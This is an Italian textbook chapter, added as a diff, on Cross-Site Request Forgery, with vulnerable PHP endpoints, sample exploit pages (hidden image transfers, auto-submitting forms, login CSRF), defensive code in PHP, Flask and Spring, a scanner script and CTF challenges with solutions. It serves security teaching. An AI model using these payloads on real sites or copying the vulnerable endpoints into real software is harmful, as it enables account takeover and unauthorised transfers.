@@ -1,0 +1,1031 @@
+\chapter{Cross-Site Request Forgery (CSRF)}
+
+\section{Introduzione}
+
+Cross-Site Request Forgery (CSRF, pronunciato "sea-surf") è un attacco che forza un utente autenticato a eseguire azioni non intenzionali su un'applicazione web in cui è attualmente autenticato. A differenza di XSS che sfrutta la fiducia dell'utente verso un sito, CSRF sfrutta la fiducia del sito verso l'utente.
+
+\subsection{Differenza tra XSS e CSRF}
+
+\begin{center}
+\begin{tabular}{|p{4cm}|p{5cm}|p{5cm}|}
+\hline
+\textbf{Aspetto} & \textbf{XSS} & \textbf{CSRF} \\
+\hline
+Cosa sfrutta & Fiducia dell'utente nel sito & Fiducia del sito nell'utente \\
+\hline
+Obiettivo & Eseguire codice nel browser della vittima & Far eseguire azioni al server \\
+\hline
+Richiede autenticazione & No & Sì \\
+\hline
+Dove si esegue & Client-side (browser) & Server-side (richiesta HTTP) \\
+\hline
+Cosa può rubare & Cookie, sessioni, dati & Non può leggere risposte \\
+\hline
+\end{tabular}
+\end{center}
+
+\subsection{Impatto}
+
+\begin{itemize}
+    \item \textbf{Trasferimenti non autorizzati:} Banking, e-commerce
+    \item \textbf{Modifica dati:} Email, password, profilo utente
+    \item \textbf{Azioni privilegi elevati:} Creazione admin, modifica permessi
+    \item \textbf{Social engineering:} Post automatici, follow/unfollow
+    \item \textbf{Combinazione con XSS:} Attacchi devastanti
+\end{itemize}
+
+\section{Come funziona CSRF}
+
+\subsection{Meccanismo base}
+
+\begin{verbatim}
+Precondizioni:
+1. Vittima è autenticata su vulnerable-bank.com
+2. Browser ha cookie di sessione valido
+
+Attacco:
+1. Vittima visita evil-site.com (controllato dall'attacker)
+2. evil-site.com contiene form/JavaScript che fa richiesta a vulnerable-bank.com
+3. Browser invia automaticamente i cookie di sessione con la richiesta
+4. vulnerable-bank.com riceve richiesta con credenziali valide
+5. Azione eseguita senza consenso della vittima
+\end{verbatim}
+
+\subsection{Diagramma di attacco}
+
+\begin{verbatim}
+[Vittima autenticata] → [vulnerable-bank.com]
+        |                      ↑
+        | 1. Visita            | 3. Richiesta con cookie
+        ↓                      |    (transfer money)
+[evil-site.com] ---------------+
+   (contiene form CSRF)
+\end{verbatim}
+
+\section{Esempi di attacco CSRF}
+
+\subsection{Attacco via GET (vulnerabile)}
+
+\subsubsection{Codice vulnerabile}
+
+\begin{lstlisting}[language=PHP, caption=VULNERABILE - Azione critica via GET]
+<?php
+// transfer.php - VULNERABILE
+session_start();
+
+if (!isset($_SESSION['user_id'])) {
+    die("Non autenticato");
+}
+
+// Azione critica eseguita con GET!
+if (isset($_GET['to']) && isset($_GET['amount'])) {
+    $to = $_GET['to'];
+    $amount = $_GET['amount'];
+    $from = $_SESSION['user_id'];
+
+    // Trasferimento denaro
+    transfer_money($from, $to, $amount);
+
+    echo "Trasferimento di €$amount a $to completato!";
+}
+?>
+\end{lstlisting}
+
+\subsubsection{Exploit CSRF}
+
+\begin{lstlisting}[language=HTML, caption=Attacco CSRF via image tag]
+<!-- evil-site.com -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Guarda questo gattino!</title>
+</head>
+<body>
+    <h1>Foto divertente</h1>
+
+    <!-- Immagine fake che triggera il trasferimento -->
+    <img src="http://vulnerable-bank.com/transfer.php?to=attacker&amount=1000"
+         width="0" height="0" style="display:none;">
+
+    <!-- Quando il browser carica l'immagine, esegue GET
+         I cookie di sessione sono inviati automaticamente!
+         Trasferimento eseguito senza che la vittima lo sappia -->
+</body>
+</html>
+\end{lstlisting}
+
+\subsection{Attacco via POST}
+
+\subsubsection{Codice vulnerabile}
+
+\begin{lstlisting}[language=PHP, caption=VULNERABILE - POST senza CSRF protection]
+<?php
+// change_email.php - VULNERABILE
+session_start();
+
+if (!isset($_SESSION['user_id'])) {
+    die("Non autenticato");
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $new_email = $_POST['email'];
+    $user_id = $_SESSION['user_id'];
+
+    // Cambia email senza verificare CSRF token!
+    update_user_email($user_id, $new_email);
+
+    echo "Email aggiornata a: $new_email";
+}
+?>
+\end{lstlisting}
+
+\subsubsection{Exploit CSRF con auto-submit form}
+
+\begin{lstlisting}[language=HTML, caption=CSRF POST attack con auto-submit]
+<!-- evil-site.com -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Vinci un iPhone!</title>
+</head>
+<body>
+    <h1>Complimenti! Hai vinto!</h1>
+    <p>Attendi il reindirizzamento...</p>
+
+    <!-- Form nascosto che si auto-submit -->
+    <form id="csrf-form" action="http://vulnerable-bank.com/change_email.php" method="POST">
+        <input type="hidden" name="email" value="attacker@evil.com">
+    </form>
+
+    <script>
+        // Auto-submit dopo 1 secondo
+        setTimeout(function() {
+            document.getElementById('csrf-form').submit();
+        }, 1000);
+    </script>
+
+    <!-- Risultato: email della vittima cambiata in attacker@evil.com
+         Attacker può ora fare password reset! -->
+</body>
+</html>
+\end{lstlisting}
+
+\subsection{CSRF via XMLHttpRequest}
+
+\begin{lstlisting}[language=HTML, caption=CSRF con fetch/XMLHttpRequest]
+<!-- evil-site.com -->
+<script>
+// CSRF via fetch API
+fetch('http://vulnerable-site.com/api/delete-account', {
+    method: 'POST',
+    credentials: 'include',  // Invia cookie cross-origin
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        confirm: true
+    })
+})
+.then(response => {
+    console.log('Account eliminato!');
+})
+.catch(error => {
+    console.log('Errore CORS o altro');
+});
+
+// Nota: Bloccato da CORS se il server ha protezioni
+// Ma se il server permette: Access-Control-Allow-Credentials: true
+// E: Access-Control-Allow-Origin: http://evil-site.com
+// Allora funziona!
+</script>
+\end{lstlisting}
+
+\section{Protezione CSRF}
+
+\subsection{1. CSRF Tokens (Synchronizer Token Pattern)}
+
+La difesa più efficace: genera un token random per ogni sessione/richiesta e validalo server-side.
+
+\subsubsection{Implementazione PHP}
+
+\begin{lstlisting}[language=PHP, caption=SICURO - CSRF token generation e validation]
+<?php
+// csrf_protection.php
+session_start();
+
+class CSRFProtection {
+    /**
+     * Genera CSRF token per la sessione corrente
+     */
+    public static function generateToken() {
+        if (!isset($_SESSION['csrf_token'])) {
+            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+        }
+        return $_SESSION['csrf_token'];
+    }
+
+    /**
+     * Valida CSRF token
+     */
+    public static function validateToken($token) {
+        if (!isset($_SESSION['csrf_token'])) {
+            return false;
+        }
+
+        // Usa hash_equals per prevenire timing attacks
+        return hash_equals($_SESSION['csrf_token'], $token);
+    }
+
+    /**
+     * Genera campo hidden HTML con token
+     */
+    public static function getTokenField() {
+        $token = self::generateToken();
+        return '<input type="hidden" name="csrf_token" value="' . htmlspecialchars($token) . '">';
+    }
+}
+
+// Uso in form
+?>
+<!DOCTYPE html>
+<html>
+<body>
+    <form action="transfer.php" method="POST">
+        <?php echo CSRFProtection::getTokenField(); ?>
+
+        <input type="text" name="to" placeholder="Destinatario">
+        <input type="number" name="amount" placeholder="Importo">
+        <button type="submit">Trasferisci</button>
+    </form>
+</body>
+</html>
+
+<?php
+// transfer.php - Con protezione CSRF
+session_start();
+require_once 'csrf_protection.php';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Valida CSRF token
+    if (!isset($_POST['csrf_token']) ||
+        !CSRFProtection::validateToken($_POST['csrf_token'])) {
+        http_response_code(403);
+        die("CSRF token non valido!");
+    }
+
+    // Procedi con l'azione
+    $to = $_POST['to'];
+    $amount = $_POST['amount'];
+
+    transfer_money($_SESSION['user_id'], $to, $amount);
+    echo "Trasferimento completato!";
+}
+?>
+\end{lstlisting}
+
+\subsubsection{Implementazione Python (Flask)}
+
+\begin{lstlisting}[language=Python, caption=SICURO - Flask-WTF CSRF protection]
+from flask import Flask, render_template, request, session
+from flask_wtf.csrf import CSRFProtect
+from wtforms import Form, StringField, IntegerField
+from wtforms.validators import DataRequired
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'your-secret-key-here'
+
+# Abilita CSRF protection globalmente
+csrf = CSRFProtect(app)
+
+class TransferForm(Form):
+    to = StringField('Destinatario', validators=[DataRequired()])
+    amount = IntegerField('Importo', validators=[DataRequired()])
+
+@app.route('/transfer', methods=['GET', 'POST'])
+def transfer():
+    form = TransferForm(request.form)
+
+    if request.method == 'POST' and form.validate():
+        # CSRF token validato automaticamente da Flask-WTF
+        to = form.to.data
+        amount = form.amount.data
+
+        # Esegui trasferimento
+        transfer_money(session['user_id'], to, amount)
+
+        return "Trasferimento completato!"
+
+    # Render form con CSRF token automatico
+    return render_template('transfer.html', form=form)
+
+# Template transfer.html
+"""
+<form method="POST">
+    {{ form.csrf_token }}
+    {{ form.to.label }} {{ form.to }}
+    {{ form.amount.label }} {{ form.amount }}
+    <button type="submit">Trasferisci</button>
+</form>
+"""
+
+# Per AJAX/API endpoints
+@app.route('/api/transfer', methods=['POST'])
+def api_transfer():
+    # CSRF token può essere passato nell'header X-CSRFToken
+    # Flask-WTF lo valida automaticamente
+    data = request.get_json()
+    transfer_money(session['user_id'], data['to'], data['amount'])
+    return {"status": "success"}
+\end{lstlisting}
+
+\subsubsection{Implementazione Java (Spring Security)}
+
+\begin{lstlisting}[language=Java, caption=SICURO - Spring Security CSRF]
+import org.springframework.security.config.annotation.web.builders.HttpSecurity;
+import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
+import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
+
+@EnableWebSecurity
+public class SecurityConfig extends WebSecurityConfigurerAdapter {
+
+    @Override
+    protected void configure(HttpSecurity http) throws Exception {
+        http
+            .csrf()
+                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
+            .and()
+            .authorizeRequests()
+                .anyRequest().authenticated();
+    }
+}
+
+// Controller
+import org.springframework.security.web.csrf.CsrfToken;
+
+@Controller
+public class TransferController {
+
+    @PostMapping("/transfer")
+    public String transfer(
+        @RequestParam String to,
+        @RequestParam BigDecimal amount,
+        HttpServletRequest request
+    ) {
+        // CSRF token validato automaticamente da Spring Security
+
+        User user = (User) request.getSession().getAttribute("user");
+        transferService.transfer(user.getId(), to, amount);
+
+        return "redirect:/success";
+    }
+}
+
+// Template (Thymeleaf)
+/*
+<form th:action="@{/transfer}" method="post">
+    <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}"/>
+    <input type="text" name="to" />
+    <input type="number" name="amount" />
+    <button type="submit">Trasferisci</button>
+</form>
+*/
+\end{lstlisting}
+
+\subsection{2. SameSite Cookies}
+
+L'attributo SameSite previene l'invio di cookie in richieste cross-site.
+
+\subsubsection{Valori SameSite}
+
+\begin{description}
+    \item[Strict] Cookie inviato SOLO in richieste same-site
+    \item[Lax] Cookie inviato in richieste same-site + top-level navigation GET (default)
+    \item[None] Cookie inviato anche cross-site (richiede Secure)
+\end{description}
+
+\begin{lstlisting}[language=PHP, caption=SameSite cookie configuration]
+<?php
+// PHP 7.3+ con SameSite
+session_start([
+    'cookie_lifetime' => 3600,
+    'cookie_secure' => true,      // Solo HTTPS
+    'cookie_httponly' => true,    // No JavaScript access
+    'cookie_samesite' => 'Strict' // Protezione CSRF
+]);
+
+// Set cookie manualmente con SameSite
+setcookie(
+    'session_id',
+    $session_value,
+    [
+        'expires' => time() + 3600,
+        'path' => '/',
+        'domain' => 'example.com',
+        'secure' => true,
+        'httponly' => true,
+        'samesite' => 'Strict'
+    ]
+);
+?>
+\end{lstlisting}
+
+\begin{lstlisting}[language=Python, caption=SameSite cookies in Flask]
+from flask import Flask, make_response
+
+app = Flask(__name__)
+app.config.update(
+    SESSION_COOKIE_SECURE=True,
+    SESSION_COOKIE_HTTPONLY=True,
+    SESSION_COOKIE_SAMESITE='Lax'  # o 'Strict'
+)
+
+@app.route('/login', methods=['POST'])
+def login():
+    response = make_response("Logged in")
+
+    # Set cookie con SameSite
+    response.set_cookie(
+        'session_id',
+        value='abc123',
+        secure=True,
+        httponly=True,
+        samesite='Strict'
+    )
+
+    return response
+\end{lstlisting}
+
+\begin{lstlisting}[language=Java, caption=SameSite cookies in Java]
+import javax.servlet.http.Cookie;
+import javax.servlet.http.HttpServletResponse;
+
+public void setSecureCookie(HttpServletResponse response, String name, String value) {
+    Cookie cookie = new Cookie(name, value);
+    cookie.setSecure(true);
+    cookie.setHttpOnly(true);
+    cookie.setPath("/");
+    cookie.setMaxAge(3600);
+
+    // SameSite attribute
+    response.setHeader("Set-Cookie",
+        String.format("%s=%s; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600",
+            name, value));
+}
+\end{lstlisting}
+
+\subsubsection{Comportamento SameSite}
+
+\begin{center}
+\begin{tabular}{|p{4cm}|c|c|c|}
+\hline
+\textbf{Scenario} & \textbf{Strict} & \textbf{Lax} & \textbf{None} \\
+\hline
+Link da altro sito (GET) & ✗ & ✓ & ✓ \\
+\hline
+Form POST da altro sito & ✗ & ✗ & ✓ \\
+\hline
+AJAX da altro sito & ✗ & ✗ & ✓ \\
+\hline
+Iframe da altro sito & ✗ & ✗ & ✓ \\
+\hline
+Richieste same-site & ✓ & ✓ & ✓ \\
+\hline
+\end{tabular}
+\end{center}
+
+\subsection{3. Double Submit Cookie Pattern}
+
+Token CSRF salvato sia in cookie che in parametro/header, confrontati server-side.
+
+\begin{lstlisting}[language=JavaScript, caption=Double Submit Cookie - Client side]
+// Quando la pagina carica, leggi CSRF token dal cookie
+function getCsrfToken() {
+    const match = document.cookie.match(/csrf_token=([^;]+)/);
+    return match ? match[1] : null;
+}
+
+// Aggiungi token a tutte le richieste AJAX
+fetch('/api/transfer', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'X-CSRF-Token': getCsrfToken()  // Token nell'header
+    },
+    credentials: 'include',  // Invia cookies (incluso csrf_token)
+    body: JSON.stringify({
+        to: 'beneficiary',
+        amount: 100
+    })
+});
+\end{lstlisting}
+
+\begin{lstlisting}[language=Python, caption=Double Submit Cookie - Server side]
+from flask import Flask, request, make_response
+import secrets
+
+app = Flask(__name__)
+
+@app.route('/login', methods=['POST'])
+def login():
+    # Genera CSRF token
+    csrf_token = secrets.token_hex(32)
+
+    response = make_response("Logged in")
+
+    # Salva token in cookie
+    response.set_cookie(
+        'csrf_token',
+        csrf_token,
+        httponly=False,  # JavaScript deve poterlo leggere
+        secure=True,
+        samesite='Strict'
+    )
+
+    return response
+
+@app.route('/api/transfer', methods=['POST'])
+def transfer():
+    # Leggi token da cookie
+    cookie_token = request.cookies.get('csrf_token')
+
+    # Leggi token da header
+    header_token = request.headers.get('X-CSRF-Token')
+
+    # Confronta
+    if not cookie_token or not header_token or cookie_token != header_token:
+        return {"error": "CSRF token mismatch"}, 403
+
+    # Procedi con l'azione
+    data = request.get_json()
+    transfer_money(data['to'], data['amount'])
+
+    return {"status": "success"}
+\end{lstlisting}
+
+\subsection{4. Referer/Origin Header Validation}
+
+Verifica che la richiesta provenga dallo stesso sito.
+
+\begin{lstlisting}[language=PHP, caption=Referer validation]
+<?php
+function validate_referer() {
+    $allowed_origins = ['https://mysite.com', 'https://www.mysite.com'];
+
+    // Preferisci Origin header (più affidabile)
+    $origin = $_SERVER['HTTP_ORIGIN'] ?? null;
+
+    if ($origin && in_array($origin, $allowed_origins)) {
+        return true;
+    }
+
+    // Fallback su Referer
+    $referer = $_SERVER['HTTP_REFERER'] ?? '';
+
+    foreach ($allowed_origins as $allowed) {
+        if (strpos($referer, $allowed) === 0) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+// Uso
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (!validate_referer()) {
+        http_response_code(403);
+        die("Richiesta da origine non autorizzata");
+    }
+
+    // Procedi
+}
+?>
+\end{lstlisting}
+
+\begin{lstlisting}[language=Python, caption=Origin header validation]
+from flask import Flask, request
+from urllib.parse import urlparse
+
+app = Flask(__name__)
+
+ALLOWED_ORIGINS = ['https://mysite.com', 'https://www.mysite.com']
+
+def validate_origin():
+    """Valida Origin header"""
+    origin = request.headers.get('Origin')
+
+    if not origin:
+        # Nessun Origin header (navigazione diretta o old browser)
+        # Decide in base alla policy: permetti o blocca
+        return False
+
+    if origin in ALLOWED_ORIGINS:
+        return True
+
+    return False
+
+@app.route('/api/transfer', methods=['POST'])
+def transfer():
+    if not validate_origin():
+        return {"error": "Invalid origin"}, 403
+
+    # Procedi
+    data = request.get_json()
+    transfer_money(data['to'], data['amount'])
+
+    return {"status": "success"}
+\end{lstlisting}
+
+\textbf{Limitazioni del Referer/Origin:}
+
+\begin{itemize}
+    \item Alcuni browser/proxy rimuovono Referer per privacy
+    \item Origin non inviato in richieste GET (solo POST, PUT, DELETE)
+    \item Non affidabile al 100\% come unica difesa
+    \item Meglio usarlo come defense in depth
+\end{itemize}
+
+\subsection{5. Custom Request Headers}
+
+API moderne richiedono header custom che browser non inviano automaticamente in richieste cross-origin.
+
+\begin{lstlisting}[language=JavaScript, caption=Custom header CSRF protection]
+// Client side
+fetch('/api/transfer', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'X-Requested-With': 'XMLHttpRequest',  // Custom header
+        'X-Custom-Header': 'my-app'             // Header specifico
+    },
+    credentials: 'include',
+    body: JSON.stringify({ to: 'user', amount: 100 })
+});
+
+// Un semplice <form> o <img> non può settare header custom
+// Quindi richieste CSRF non avranno questi header
+\end{lstlisting}
+
+\begin{lstlisting}[language=Python, caption=Custom header validation]
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/api/transfer', methods=['POST'])
+def transfer():
+    # Verifica presenza header custom
+    if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
+        return {"error": "Invalid request"}, 403
+
+    # Procedi
+    data = request.get_json()
+    transfer_money(data['to'], data['amount'])
+
+    return {"status": "success"}
+
+# Nota: CORS deve essere configurato per permettere header custom
+@app.after_request
+def after_request(response):
+    origin = request.headers.get('Origin')
+
+    if origin == 'https://mysite.com':
+        response.headers['Access-Control-Allow-Origin'] = origin
+        response.headers['Access-Control-Allow-Credentials'] = 'true'
+        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, X-Requested-With'
+
+    return response
+\end{lstlisting}
+
+\section{Login CSRF}
+
+Tipo speciale di CSRF che forza la vittima a autenticarsi con account dell'attacker.
+
+\subsection{Scenario d'attacco}
+
+\begin{lstlisting}[language=HTML, caption=Login CSRF attack]
+<!-- evil-site.com -->
+<html>
+<body>
+    <h1>Contenuto interessante...</h1>
+
+    <!-- Form nascosto che fa login con credenziali attacker -->
+    <form id="login" action="https://victim-site.com/login" method="POST">
+        <input type="hidden" name="username" value="attacker">
+        <input type="hidden" name="password" value="attacker_password">
+    </form>
+
+    <script>
+        // Auto-submit
+        document.getElementById('login').submit();
+    </script>
+</body>
+</html>
+
+<!-- Risultato:
+1. Vittima viene autenticata come "attacker" su victim-site.com
+2. Vittima usa il sito pensando di usare il proprio account
+3. Dati sensibili (carte credito, indirizzi) salvati nell'account attacker
+4. Attacker fa login nel proprio account e vede i dati della vittima
+-->
+\end{lstlisting}
+
+\subsection{Protezione Login CSRF}
+
+\begin{lstlisting}[language=PHP, caption=CSRF token anche per login]
+<?php
+session_start();
+
+// Genera CSRF token PRIMA del login
+if (!isset($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Valida CSRF token
+    if (!isset($_POST['csrf_token']) ||
+        !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
+        die("CSRF token non valido!");
+    }
+
+    // Procedi con login
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    if (authenticate($username, $password)) {
+        $_SESSION['user_id'] = get_user_id($username);
+        // Rigenera token dopo login
+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+        header('Location: /dashboard');
+    }
+}
+?>
+
+<form method="POST">
+    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+    <input type="text" name="username">
+    <input type="password" name="password">
+    <button type="submit">Login</button>
+</form>
+\end{lstlisting}
+
+\section{CSRF in API REST}
+
+\subsection{Vulnerabilità API CSRF}
+
+\begin{lstlisting}[language=JavaScript, caption=API vulnerabile a CSRF]
+// API endpoint senza CSRF protection
+app.post('/api/v1/users/:id/delete', authenticateUser, (req, res) => {
+    const userId = req.params.id;
+
+    // Se usa session cookies per auth, è vulnerabile a CSRF!
+    if (req.session.userId === userId || req.session.isAdmin) {
+        deleteUser(userId);
+        res.json({ success: true });
+    }
+});
+
+// Attack:
+/*
+<script>
+fetch('https://api.example.com/api/v1/users/123/delete', {
+    method: 'POST',
+    credentials: 'include'  // Invia session cookie
+});
+</script>
+*/
+\end{lstlisting}
+
+\subsection{Protezione API}
+
+\begin{lstlisting}[language=JavaScript, caption=API protection: Bearer tokens invece di cookies]
+// Meglio: Usa Bearer tokens (JWT) invece di session cookies
+app.post('/api/v1/users/:id/delete', (req, res) => {
+    // Token nell'header Authorization (non inviato automaticamente)
+    const token = req.headers.authorization?.split(' ')[1];
+
+    if (!token) {
+        return res.status(401).json({ error: 'No token' });
+    }
+
+    try {
+        const decoded = jwt.verify(token, SECRET_KEY);
+        const userId = req.params.id;
+
+        if (decoded.userId === userId || decoded.isAdmin) {
+            deleteUser(userId);
+            res.json({ success: true });
+        }
+    } catch (error) {
+        res.status(403).json({ error: 'Invalid token' });
+    }
+});
+
+// Client deve esplicitamente inviare il token:
+/*
+fetch('/api/v1/users/123/delete', {
+    method: 'POST',
+    headers: {
+        'Authorization': 'Bearer ' + localStorage.getItem('token')
+    }
+});
+*/
+
+// CSRF non funziona perché l'attacker non può:
+// 1. Leggere il token da localStorage (same-origin policy)
+// 2. Far inviare automaticamente l'header Authorization
+\end{lstlisting}
+
+\section{Testing per CSRF}
+
+\subsection{Manual Testing}
+
+\begin{lstlisting}[language=HTML, caption=CSRF PoC generator]
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+
+    <form id="csrf-form" action="http://target.com/transfer" method="POST">
+        <input type="text" name="to" value="attacker">
+        <input type="text" name="amount" value="1000">
+        <input type="submit" value="Click me (or auto-submit)">
+    </form>
+
+    <script>
+        // Auto-submit dopo 1 secondo
+        // setTimeout(() => document.getElementById('csrf-form').submit(), 1000);
+
+        // Oppure submit al click di qualsiasi elemento
+        // document.body.addEventListener('click', () => {
+        //     document.getElementById('csrf-form').submit();
+        // });
+    </script>
+</body>
+</html>
+\end{lstlisting}
+
+\subsection{Burp Suite CSRF PoC Generator}
+
+\begin{verbatim}
+1. Intercetta richiesta con Burp Proxy
+2. Invia a Repeater
+3. Right-click → Engagement tools → Generate CSRF PoC
+4. Burp genera HTML PoC automaticamente
+5. Testa il PoC nel browser
+6. Se funziona → vulnerabilità confermata
+\end{verbatim}
+
+\subsection{Automated Testing}
+
+\begin{lstlisting}[language=Python, caption=CSRF scanner script]
+import requests
+from bs4 import BeautifulSoup
+
+def check_csrf_protection(url, session_cookie):
+    """
+    Verifica se un endpoint ha protezione CSRF
+    """
+    # Test 1: Richiesta senza CSRF token
+    cookies = {'session': session_cookie}
+    response = requests.post(url, cookies=cookies, data={
+        'to': 'test',
+        'amount': '100'
+    })
+
+    if response.status_code == 200:
+        print(f"[!] VULNERABILE: {url} accetta richieste senza CSRF token")
+        return True
+
+    # Test 2: Richiesta con token invalido
+    response = requests.post(url, cookies=cookies, data={
+        'to': 'test',
+        'amount': '100',
+        'csrf_token': 'invalid_token_123'
+    })
+
+    if response.status_code == 200:
+        print(f"[!] VULNERABILE: {url} non valida CSRF token correttamente")
+        return True
+
+    # Test 3: Verifica SameSite cookies
+    set_cookie = response.headers.get('Set-Cookie', '')
+    if 'SameSite' not in set_cookie:
+        print(f"[!] WARNING: {url} non usa SameSite cookies")
+
+    print(f"[+] SICURO: {url} ha protezione CSRF")
+    return False
+
+# Uso
+check_csrf_protection('http://target.com/transfer', 'session_id_here')
+\end{lstlisting}
+
+\section{Esercizi CTF-Style}
+
+\subsection{Challenge 1: Basic CSRF}
+
+URL: \texttt{http://ctf-csrf.local/change-email}
+
+Endpoint vulnerabile:
+\begin{lstlisting}[language=PHP]
+<?php
+session_start();
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $_SESSION['email'] = $_POST['email'];
+    echo "Email cambiata!";
+}
+?>
+\end{lstlisting}
+
+\textbf{Task:} Crea un PoC HTML che cambia l'email della vittima.
+
+\textbf{Soluzione:}
+\begin{lstlisting}[language=HTML]
+<form action="http://ctf-csrf.local/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+<script>document.forms[0].submit();</script>
+\end{lstlisting}
+
+\subsection{Challenge 2: CSRF Token Bypass}
+
+L'applicazione controlla il token ma ha un bug:
+
+\begin{lstlisting}[language=PHP]
+if (isset($_POST['csrf_token']) && $_POST['csrf_token'] == $_SESSION['csrf_token']) {
+    // OK
+} elseif (!isset($_POST['csrf_token'])) {
+    // Se token non presente, permetti comunque!
+    // Bug!
+}
+\end{lstlisting}
+
+\textbf{Soluzione:} Invia richiesta senza parametro \texttt{csrf\_token}.
+
+\subsection{Challenge 3: Login CSRF}
+
+Sfrutta login CSRF per catturare dati sensibili.
+
+\textbf{Flag:} CTF\{l0g1n\_csrf\_1s\_d4ng3r0us\}
+
+\section{Case Study: Netflix Login CSRF (2006)}
+
+\subsection{Vulnerabilità}
+
+Netflix non proteggeva l'endpoint di login con CSRF token.
+
+\subsection{Attacco}
+
+\begin{enumerate}
+    \item Attacker crea account Netflix con carta di credito prepagata
+    \item Attacker crea pagina con form di login auto-submit
+    \item Vittima visita pagina malevola
+    \item Vittima viene autenticata con account attacker
+    \item Vittima aggiunge la propria carta di credito pensando di configurare il proprio account
+    \item Attacker fa login e vede i dettagli della carta della vittima
+\end{enumerate}
+
+\subsection{Fix}
+
+Netflix ha implementato CSRF token su tutti gli endpoint sensibili, incluso login.
+
+\section{Best Practices}
+
+\begin{itemize}
+    \item[$\square$] \textbf{CSRF Tokens:} Usa su TUTTI gli endpoint state-changing
+    \item[$\square$] \textbf{SameSite Cookies:} Imposta a Lax o Strict
+    \item[$\square$] \textbf{HTTPOnly + Secure:} Per session cookies
+    \item[$\square$] \textbf{Verifica HTTP Method:} GET per read-only, POST/PUT/DELETE per modifiche
+    \item[$\square$] \textbf{No GET per azioni critiche:} Mai usare GET per trasferimenti, eliminazioni
+    \item[$\square$] \textbf{Double Submit Cookie:} Per API stateless
+    \item[$\square$] \textbf{Origin/Referer:} Come defense in depth
+    \item[$\square$] \textbf{Re-authentication:} Per azioni critiche (cambio password, trasferimenti grandi)
+    \item[$\square$] \textbf{CAPTCHA:} Per operazioni sensibili
+    \item[$\square$] \textbf{Framework features:} Usa protezioni built-in (Flask-WTF, Spring Security)
+\end{itemize}
+
+\section{CSRF vs XSS: Difese complementari}
+
+\begin{itemize}
+    \item \textbf{CSRF tokens proteggono da:} Richieste cross-site non autorizzate
+    \item \textbf{XSS bypassa CSRF:} Se c'è XSS, l'attacker può leggere CSRF token dal DOM
+    \item \textbf{Defense in depth:} Proteggi da entrambi
+    \item \textbf{HTTPOnly cookies:} Proteggono da XSS ma NON da CSRF
+    \item \textbf{SameSite cookies:} Proteggono da CSRF ma NON da XSS
+\end{itemize}
+
+\section{Conclusioni}
+
+CSRF è una vulnerabilità insidiosa che sfrutta la fiducia implicita tra browser e server. Le chiavi per prevenirla sono:
+
+\begin{enumerate}
+    \item \textbf{Never trust automatic credentials:} Cookie, HTTP Auth
+    \item \textbf{Require explicit proof:} CSRF tokens, custom headers
+    \item \textbf{Use SameSite cookies:} Prima linea di difesa
+    \item \textbf{Validate Origin:} Quando possibile
+    \item \textbf{Defense in depth:} Multiple protezioni
+\end{enumerate}
+
+Nel prossimo capitolo esploreremo Autenticazione e Gestione Sessioni, dove vedremo come proteggere password, implementare MFA, OAuth2 e JWT in modo sicuro.
